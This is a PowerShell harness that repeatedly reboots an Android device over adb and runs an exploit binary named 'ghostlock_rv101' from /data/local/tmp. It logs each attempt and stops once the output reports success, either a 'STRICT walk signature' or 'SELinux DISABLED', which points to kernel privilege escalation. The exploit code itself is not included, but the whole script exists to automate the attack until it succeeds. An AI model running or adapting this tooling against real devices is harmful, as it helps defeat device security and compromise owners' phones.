# ghostlock_reboot_run.ps1 — reboot-per-attempt runner for the RV101 exploit.
# Usage: pwsh -File scripts/ghostlock_reboot_run.ps1 -Cycles 3 -Env "GL_SKB_PAD=64 ..." -Args "--selftest" -Log "run45" -Success "STRICT"
# Each cycle: adb reboot -> wait for device + 150s uptime -> run the exploit
# (GL_SETUP_ATTEMPTS=1) with host-side tee -> break when -Success appears.
param(
  [int]$Cycles = 3,
  [string]$Env = "",
  [string]$ExploitArgs = "--selftest",
  [string]$Log = "runXX",
  [string]$Success = "verified",
  [int]$BootWait = 150
)
$serial = "<DEVICE_SERIAL>"
$exe = "/data/local/tmp/ghostlock_rv101"
for ($c = 1; $c -le $Cycles; $c++) {
  Write-Host "=== cycle $c/$Cycles reboot at $(Get-Date -Format HH:mm:ss) ==="
  adb -s $serial reboot
  Start-Sleep -Seconds 20
  $deadline = (Get-Date).AddMinutes(10)
  $ready = $false
  while ((Get-Date) -lt $deadline) {
    $d = adb devices 2>$null | Select-String "$serial\s+device"
    if ($d) {
      $up = adb -s $serial shell "cat /proc/uptime" 2>$null
      if ($up -match "(\d+)\.(\d+)") {
        $secs = [int]$Matches[1]
        if ($secs -ge $BootWait) { $ready = $true; Write-Host "ready at uptime ${secs}s"; break }
      }
    }
    Start-Sleep -Seconds 15
  }
  if (-not $ready) { Write-Host "device never became ready"; continue }
  adb -s $serial shell "chmod 755 $exe" 2>$null | Out-Null
  $logfile = "reports/ghostlock_runlogs/exploit_$Log.log"
  $out = adb -s $serial shell "$Env GL_SETUP_ATTEMPTS=1 $exe $ExploitArgs" 2>&1
  $out | Tee-Object $logfile | Out-Null
  Write-Host "=== cycle $c finished exit=$LASTEXITCODE ==="
  if ($out -match "carried the STRICT walk signature|SELinux DISABLED") {
    Write-Host "SUCCESS detected on cycle $c"
    break
  }
}
Write-Host "RUNNER_DONE at $(Get-Date -Format HH:mm:ss)"
